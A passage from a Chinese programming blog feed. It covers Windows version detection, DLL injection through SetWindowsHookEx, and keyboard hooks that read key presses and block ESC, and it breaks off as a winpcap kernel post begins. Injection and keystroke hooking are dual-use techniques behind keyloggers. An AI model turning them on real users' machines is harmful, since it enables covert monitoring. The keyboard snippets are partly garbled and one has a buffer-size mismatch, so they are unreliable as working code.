class="hljs-string">&quot;urn:schemas-microsoft-com:compatibility.v1&quot;</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">application</span>&gt;</span>   <br>            <span class="hljs-comment">&lt;!-- Windows 10 --&gt;</span>   <br>            <span class="hljs-tag">&lt;<span class="hljs-name">supportedOS</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;&#123;8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a&#125;&quot;</span>/&gt;</span>  <br>            <span class="hljs-comment">&lt;!-- Windows 8.1 --&gt;</span>  <br>            <span class="hljs-tag">&lt;<span class="hljs-name">supportedOS</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;&#123;1f676c76-80e1-4239-95bb-83d0f6d0da78&#125;&quot;</span>/&gt;</span>  <br>            <span class="hljs-comment">&lt;!-- Windows Vista --&gt;</span>  <br>            <span class="hljs-tag">&lt;<span class="hljs-name">supportedOS</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;&#123;e2011457-1546-43c5-a5fe-008deee3d3f0&#125;&quot;</span>/&gt;</span>   <br>            <span class="hljs-comment">&lt;!-- Windows 7 --&gt;</span>  <br>            <span class="hljs-tag">&lt;<span class="hljs-name">supportedOS</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;&#123;35138b9a-5d96-4fbd-8e2d-a2440225f93a&#125;&quot;</span>/&gt;</span>  <br>            <span class="hljs-comment">&lt;!-- Windows 8 --&gt;</span>  <br>            <span class="hljs-tag">&lt;<span class="hljs-name">supportedOS</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;&#123;4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38&#125;&quot;</span>/&gt;</span>  <br>        <span class="hljs-tag">&lt;/<span class="hljs-name">application</span>&gt;</span>   <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">compatibility</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">assembly</span>&gt;</span><br></code></pre></div></td></tr></table></figure>
<ul>
<li>法4 <strong>PsGetVersion,在内核驱动程序中调用该函数</strong></li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOLEAN <span class="hljs-title">PsGetVersion</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">	PULONG MajorVersion OPTIONAL,</span></span><br><span class="hljs-params"><span class="hljs-function">	PULONG MinorVersion OPTIONAL,</span></span><br><span class="hljs-params"><span class="hljs-function">	PULONG BuildNumber OPTIONAL,</span></span><br><span class="hljs-params"><span class="hljs-function">	PUNICODE_STRING CSDVersion OPTIONAL</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br>MajorVersion 是主版本号<br>MinorVersion 是副版本号<br>BuildNumber 是build版本号，如<span class="hljs-number">7600</span>等<br>CSDVersion 存放着SP1、SP2等信息<br></code></pre></div></td></tr></table></figure>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows API HOOK钩子</title>
    <url>/windows-hook/</url>
    <content><![CDATA[<p>本文讲下Windows API HOOK(钩子),主要和DLL注入联系在一起.<br />
Windows系统把每个WindowsAPI函数功能封装到了每一个DLL库文件中,从而提高程序的编译运行效率,而在应用程序运行期间动态库时,必然存在程序获取DLL中的函数地址.于是通过注入DLL来截取信息.</p>
<span id="more"></span>
<h3 id="消息hook"><a class="markdownIt-Anchor" href="#消息hook"></a> 消息HOOK</h3>
<p>HOOK(挂钩)技术,可分为 <strong>内核层(R0)HOOK</strong> , <strong>应用层(R3)HOOK</strong> ,这两种技术实现起来虽然略相似,但是 <strong>内核层HOOK</strong> 比起 <strong>应用层HOOK</strong> 难度要高得多,而且编写的代码也要保证正确(异常机制),不然万一来个赋值给一个空指针的代码,蓝屏就呵呵了…本文主要讲解 应用层hook</p>
<p>主要用到的WindowsAPI</p>
<blockquote>
<p>头文件	Winuser.h (include Windows.h)<br />
库文件	User32.lib<br />
DLL文件	User32.dll</p>
</blockquote>
<h5 id="setwindowshookex"><a class="markdownIt-Anchor" href="#setwindowshookex"></a> SetWindowsHookEx</h5>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">HHOOK WINAPI <span class="hljs-title">SetWindowsHookEx</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_ <span class="hljs-keyword">int</span>       idHook,</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_ HOOKPROC  lpfn,</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_ HINSTANCE hMod,</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_ DWORD     dwThreadId</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure>
<p>其中 <strong>idHook</strong> 可选的值有很多种, 更多选项可以到 MSDN <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms644990(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/windows/desktop/ms644990(v=vs.85).aspx</a> 查看<br />
本文用到其中的 <strong>WH_GETMESSAGE</strong> 监视发送到消息队列的消息</p>
<h5 id="getmsgproc"><a class="markdownIt-Anchor" href="#getmsgproc"></a> GetMsgProc</h5>
<p>其 <code>_In_ HOOKPROC lpfn,</code> 对应的回调函数如下</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">GetMsgProc</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_ <span class="hljs-keyword">int</span>    code,</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_ WPARAM wParam,</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_ LPARAM lParam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure>
<p><strong>lParam</strong> 参数可以转换为 **MSG***结构体<br />
<code>MSG* pMsg = (MSG*)lParam;</code></p>
<h5 id="callnexthookex"><a class="markdownIt-Anchor" href="#callnexthookex"></a> CallNextHookEx</h5>
<p>这个函数起到传递下一个钩子函数的作用,这样的话,其他钩子才可以继续执行</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">LRESULT WINAPI <span class="hljs-title">CallNextHookEx</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_opt_ HHOOK  hhk,</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_     <span class="hljs-keyword">int</span>    nCode,</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_     WPARAM wParam,</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_     LPARAM lParam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure>
<p><strong>nCode,wParam,lParam</strong> 一般都是 <strong>GetMsgProc</strong> 中的参数<br />
,而 <strong>hhk</strong> 则为 <strong>SetWindowsHookEx</strong> 返回的钩子句柄.</p>
<h5 id="unhookwindowshookex"><a class="markdownIt-Anchor" href="#unhookwindowshookex"></a> UnhookWindowsHookEx</h5>
<p>卸载钩子,与 <code>SetWindowsHookEx</code> 成对使用</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL WINAPI <span class="hljs-title">UnhookWindowsHookEx</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_ HHOOK hhk</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure>
<p>下面以一个简单例子说明(<strong>MFC</strong>)</p>
<p>Source.def文件，用于导出DLL函数</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">LIBRARY 	hookFun.dll	;dll名<br>EXPORTS						;导出函数<br>SetHook		@<span class="hljs-number">1</span><br>UnsetHook	@<span class="hljs-number">2</span><br></code></pre></div></td></tr></table></figure>
<p>DLL模块文件</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DLL_EXPORT extern <span class="hljs-meta-string">&quot;C&quot;</span> __declspec(dllexport)</span><br><span class="hljs-comment">//开始HOOK</span><br><span class="hljs-function">DLL_EXPORT <span class="hljs-keyword">void</span> _stdcall <span class="hljs-title">SetHook</span><span class="hljs-params">(DWORD pid)</span></span>;<br><span class="hljs-comment">//取消HOOK</span><br><span class="hljs-function">DLL_EXPORT <span class="hljs-keyword">void</span> _stdcall <span class="hljs-title">UnsetHook</span><span class="hljs-params">()</span></span>;<br><span class="hljs-comment">//全局 钩子句柄</span><br>HHOOK hHook_g = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">//全局 DLL模块句柄</span><br>HINSTANCE hInstance_g = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">//DLL 入口函数</span><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(_In_ <span class="hljs-keyword">void</span>* _DllHandle, _In_ <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> _Reason, _In_opt_ <span class="hljs-keyword">void</span>* _Reserved)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">if</span> (_Reason==DLL_PROCESS_ATTACH)<br>	&#123;<br>		<span class="hljs-comment">//保存当前 DLL模块的句柄到全局，以后要用！</span><br>		hInstance_g = (HINSTANCE)_DllHandle;<br>	&#125;<br>	<span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-comment">//自定义消息，处理钩子消息函数</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WM_HOOKMSG WM_USER+100 </span><br><span class="hljs-comment">//过程消息处理函数</span><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">GetMsgProc</span><span class="hljs-params">(_In_ <span class="hljs-keyword">int</span>    code,_In_ WPARAM wParam,_In_ LPARAM lParam)</span> </span><br><span class="hljs-function"></span>&#123; <br>	<span class="hljs-comment">//把 参数 lParam 转换为 MSG 结构体，获取 消息类型</span><br>	MSG* pMsg = (MSG*)lParam;<br>	<span class="hljs-keyword">if</span> (pMsg-&gt;message== WM_HOOKMSG)<br>	&#123;<br>		<span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;HOOK MSG&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>	&#125;<br>	<span class="hljs-comment">//继续传递下一个钩子</span><br>	<span class="hljs-keyword">return</span> <span class="hljs-built_in">CallNextHookEx</span>(hHook_g, code, wParam, lParam);<br>&#125;<br><span class="hljs-comment">//开始HOOK，这里过于简单，没有进行其他处理...(-｡-;)</span><br><span class="hljs-comment">//参数--&gt; 线程ID </span><br><span class="hljs-function">DLL_EXPORT <span class="hljs-keyword">void</span> _stdcall <span class="hljs-title">SetHook</span><span class="hljs-params">(DWORD tid)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-comment">//安装钩子</span><br>	<span class="hljs-comment">//hInstance_g：标识 GetMsgProc 在 该模块内</span><br>	<span class="hljs-comment">//tid：				标识是 全局钩子( tid=0 ) 还是指定 线程钩子</span><br>	hHook_g = <span class="hljs-built_in">SetWindowsHookExW</span>(WH_GETMESSAGE, GetMsgProc, hInstance_g, tid);<br>&#125;<br><span class="hljs-comment">//取消HOOK</span><br><span class="hljs-function">DLL_EXPORT <span class="hljs-keyword">void</span> _stdcall <span class="hljs-title">UnsetHook</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-comment">//卸载钩子</span><br>	<span class="hljs-built_in">UnhookWindowsHookEx</span>(hHook_g);<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>调用进程主要代码如下</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//自定义消息</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>  WM_HOOKMSG WM_USER+100</span><br><span class="hljs-comment">//路径</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>  DLL_PATH <span class="hljs-meta-string">L&quot;C:\\hookFun.dll&quot;</span></span><br><span class="hljs-comment">//SetHook 函数地址</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span><span class="hljs-params">(_stdcall* LPFNSETHOOK)</span><span class="hljs-params">(DWORD)</span></span>;<br><span class="hljs-comment">//UnsetHook 函数地址</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span><span class="hljs-params">(_stdcall* LPFNUNSETHOOK)</span><span class="hljs-params">()</span></span>;<br>HMODULE hMo = <span class="hljs-literal">NULL</span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ChookMfcDlg::OnBnClickedButton1</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-comment">//获取指定主窗口的句柄</span><br>	HWND hwndMain = ::<span class="hljs-built_in">FindWindow</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;剪贴簿查看器 - [剪贴板]&quot;</span>);<br>	<span class="hljs-comment">//保存 进程ID</span><br>	DWORD PID;<br>	<br>	<span class="hljs-keyword">char</span> szMsg[<span class="hljs-number">50</span>]=&#123; <span class="hljs-number">0</span> &#125;;<br>	<span class="hljs-comment">//返回 线程ID</span><br>	 DWORD TID= <span class="hljs-built_in">GetWindowThreadProcessId</span>(hwndMain, &amp;PID);<br>	 <span class="hljs-built_in">sprintf</span>(szMsg, <span class="hljs-string">&quot;Thread ID:%08X&quot;</span>, TID);<br>	 <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>, szMsg, szMsg, MB_ICONINFORMATION);<br>	 <span class="hljs-comment">//先动态载入 要注入的DLL，然后再把它卸载！！！</span><br>	 hMo= <span class="hljs-built_in">LoadLibrary</span>(DLL_PATH);<br>	<span class="hljs-comment">//获取模块内 SetHook 函数地址</span><br>	LPFNSETHOOK lpSethook = (LPFNSETHOOK)<span class="hljs-built_in">GetProcAddress</span>(hMo, <span class="hljs-string">&quot;SetHook&quot;</span>);<br>	<span class="hljs-comment">//调用SetHook函数</span><br>	<span class="hljs-built_in">lpSethook</span>(TID);<br>	<span class="hljs-comment">//向 要注入的 进程的线程ID 投递 我自己消息</span><br>	<span class="hljs-built_in">PostThreadMessageW</span>(TID, WM_HOOKMSG, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>	<span class="hljs-comment">//获取模块内 UnsetHook 函数地址</span><br>	LPFNUNSETHOOK lpUnSethook = (LPFNUNSETHOOK)<span class="hljs-built_in">GetProcAddress</span>(hMo, <span class="hljs-string">&quot;UnsetHook&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ChookMfcDlg::OnBnClickedButton2</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-comment">//获取模块内 UnsetHook 函数地址</span><br>	LPFNUNSETHOOK lpUnSethook = (LPFNUNSETHOOK)<span class="hljs-built_in">GetProcAddress</span>(hMo, <span class="hljs-string">&quot;UnsetHook&quot;</span>);<br>	<span class="hljs-comment">// 取消HOOK！</span><br>	<span class="hljs-built_in">lpUnSethook</span>();<br>	<span class="hljs-comment">//把 主调用进程  的 DLL 卸载，不然会一直存在主调用进程中！！</span><br>	<span class="hljs-built_in">FreeLibrary</span>(hMo);<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>一般来说,注入DLL这项技术确实很老了,<a href="http://xn--6oqs9cz1c48h6qs0zjkn9anlu.so">注入时可能会失败.so</a> …</p>
<h4 id="键盘hook"><a class="markdownIt-Anchor" href="#键盘hook"></a> 键盘HOOK</h4>
<p>这个例子没有用到DLL,直接勾住当前程序</p>
<ul>
<li>KeyboardProc —- <strong>WH_KEYBOARD(2)</strong></li>
<li>LowLevelKeyboardProc —- <strong>WH_KEYBOARD_LL(13)</strong></li>
</ul>
<p>注意 上面的 <strong>KeyboardProc</strong> 和 <strong>LowLevelKeyboardProc</strong> 函数，前者是<strong>普通</strong>的钩子函数，而后者是一个<strong>低级</strong>的钩子函数，这两个函数的参数不同，所以要获取的值也不同！！</p>
<blockquote>
<p><strong>wParam</strong> [in]<br />
Type: <strong>WPARAM</strong><br />
<strong>The virtual-key code of the key</strong> thatgenerated the keystroke message.<br />
<strong>lParam</strong> [in]<br />
Type: <strong>LPARAM</strong><br />
The repeat count, scan code, extended-key flag, contextcode, previous key-state flag, and transition-state flag. For more informationabout thelParam parameter, seeKeystroke Message Flags. The following table describes the bits of this value.<br />
<strong>由此可看出 ，wparam主要是键盘的虚拟键代码，lparam主要是：</strong><br />
The lParam parameter of a keystroke message containsadditional information about the keystroke that generated the message. Thisinformation includes therepeat count, the scan code, the extended-key flag, thecontext code, the previous key-state flag, and the transition-state flag.The following illustration shows the locations of these flags and values in thelParam parameter.</p>
</blockquote>
<p>当 <strong>SetWindowsHookEx()</strong> 参数 <strong>idHOOK</strong> 为 <strong>WH_KEYBORAD_LL</strong> 时，这个函数的参数中的 <strong>wparam</strong> 为 <strong>键盘消息</strong> ，如WM_KEYDOMN… 那么 <strong>lparam</strong> 就是一个 <strong>LPKBDLLHOOKSTRUCT结构体</strong> 了！看这个结构体的名字就知道这是一个用于 低级键盘钩子的，“LL”-&gt;”LowLevel“，呵呵~这个结构体中 包括了 <strong>虚拟键代码 和 扫描码</strong>!</p>
<p>别忘了还有那个 SetWindowsHookEx() 函数，现在在回忆一下那个函数原型：</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">HHOOK WINAPI <span class="hljs-title">SetWindowsHookEx</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_ <span class="hljs-keyword">int</span>       idHook,</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_ HOOKPROC  lpfn,</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_ HINSTANCE hMod,</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_ DWORD    dwThreadId</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure>
<ul>
<li>
<p>当<strong>IdHook为WH_KEYBOARD</strong>时，lpfn为KeyboardProc(名字自定义)，<strong>hMod为当前程序实例句柄</strong>，MFC 有多种方法获取，如: <code>AfxGetInstanceHandle()</code><br />
最后一个 <strong>dwThreadId为0</strong></p>
</li>
<li>
<p>当idHook为WH_KEYBOARD_LL时，dwThreadid必须为当前模块的线程ID！<br />
如下表:</p>
<table>
<thead>
<tr>
<th>idHook</th>
<th>lpfn</th>
<th>hMod</th>
<th>dwThreadId</th>
</tr>
</thead>
<tbody>
<tr>
<td>WH_KEYBOARD</td>
<td>KeyboardProc</td>
<td>当前程序实例句柄</td>
<td>0</td>
</tr>
<tr>
<td>WH_KEYBOARD_LL</td>
<td>LowLevelKeyboardProc</td>
<td>当前程序实例句柄</td>
<td>当前程序线程ID</td>
</tr>
</tbody>
</table>
</li>
</ul>
<p>代码如下:</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">HHOOK hHook2;<br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">KeyBoradProc</span><span class="hljs-params">(intcode,WPARAMwp,LPARAMlp)</span></span><br><span class="hljs-function"></span>&#123;<br>         <span class="hljs-keyword">if</span> (code&lt;<span class="hljs-number">0</span>)<br>         &#123;<br>                   <span class="hljs-keyword">return</span> <span class="hljs-built_in">CallNextHookEx</span>(hHook2,code,wp, lp);<br>         &#125;<br>         WCHAR szkeyValue[<span class="hljs-number">20</span>]=&#123; <span class="hljs-number">0</span> &#125;;<br>         <span class="hljs-comment">//wsprintf(szkeyValue, L&quot;%c&quot;, wp);  //虚拟键代码</span><br>            <span class="hljs-comment">//获取按键的名称          </span><br>         <span class="hljs-built_in">GetKeyNameText</span>(lp,szkeyValue, <span class="hljs-number">50</span>);<br>         <span class="hljs-built_in">AfxGetMainWnd</span>()-&gt;<span class="hljs-built_in">SetDlgItemText</span>(IDC_EDIT1,szkeyValue);<br>         <span class="hljs-keyword">return</span> <span class="hljs-built_in">CallNextHookEx</span>(hHook2,code,wp, lp);<br>&#125;<br>       <span class="hljs-comment">//安装键盘钩子</span><br>         hHook2 = <span class="hljs-built_in">SetWindowsHookEx</span>(WH_KEYBOARD,KeyBoradProc,<span class="hljs-built_in">AfxGetInstanceHandle</span>(),<span class="hljs-built_in">GetCurrentThreadId</span>());      <span class="hljs-comment">//注意这里的线程ID为当前程序的线程ID！</span><br>      <br>         <span class="hljs-comment">//卸载钩子</span><br><span class="hljs-built_in">UnhookWindowsHookEx</span>(hHook2);<br>下面是关于低级键盘钩子的代码；<br>         <span class="hljs-comment">//低级的键盘钩子</span><br>         hHook= ::<span class="hljs-built_in">SetWindowsHookEx</span>(WH_KEYBOARD_LL,myLowLevelKeyboardProc,<span class="hljs-built_in">AfxGetInstanceHandle</span>(),<span class="hljs-number">0</span>);<span class="hljs-comment">//注意这里TID为 0</span><br> <br>         <span class="hljs-comment">//卸载低级钩子</span><br><span class="hljs-built_in">UnhookWindowsHookEx</span>(hHook)<br></code></pre></div></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//低级钩子函数处理过程</span><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">LowLevelKeyboardProc</span><span class="hljs-params">(_In_int   code,_In_WPARAMwParam,_In_LPARAMlParam)</span></span><br><span class="hljs-function"></span>&#123;<br>                   <span class="hljs-keyword">if</span> (code &lt; <span class="hljs-number">0</span>)<br>                   &#123;<br>                            <span class="hljs-built_in">returnCallNextHookEx</span>(hHook,code,wParam, lParam);<br>                   &#125;<br> <br>                  <span class="hljs-comment">// 低级键盘钩子时，wparam参数为 WM键盘消息！！！</span><br> <br>                   <span class="hljs-comment">//按下的</span><br>                   <span class="hljs-keyword">if</span> (code ==HC_ACTION&amp;&amp;wParam==WM_KEYDOWN)<br>                   &#123;<br>                            LPKBDLLHOOKSTRUCTpKbs = (LPKBDLLHOOKSTRUCT)lParam;<br>                            WCHARszlMsg[<span class="hljs-number">100</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>                            <span class="hljs-built_in">wsprintf</span>(szMsg,<span class="hljs-string">L&quot;vkCode:%c-scanCode:%02X&quot;</span>,pKbs-&gt;vkCode,pKbs-&gt;scanCode);<br> <br>							<span class="hljs-comment">//ESC键扫描码</span><br>                            <span class="hljs-keyword">if</span> (pKbs-&gt;scanCode==<span class="hljs-number">0x01</span>)<br>                            &#123;                         <br>                                     returnTRUE;<br>                            &#125;<br>                   &#125;<br>                   <span class="hljs-keyword">return</span> <span class="hljs-built_in">CallNextHookEx</span>(hHook,code,wParam, lParam);<br>&#125;<br></code></pre></div></td></tr></table></figure>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>C</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>利用winpcap获取网络数据传输</title>
    <url>/windows-kernel/</url>
    <content><![CDATA[<blockquote>
<p>说明：在我没转到linux之前，我粗略的学过windows内核编程，以下是在学习过程中编录的内容，以供参考</p>
</blockquote>
<p>工具：WDK 7+VS2015 测试平台：虚拟机 WINDOWS XP</p>
<span id="more"></span>
<ul>
<li>包含的头文件</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ntifs.h&gt;</span>#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ntstrsafe.h&gt;</span></span><br></code></pre></div></td></tr></table></figure>
<ul>
<li>声明的API函数</li>
</ul>
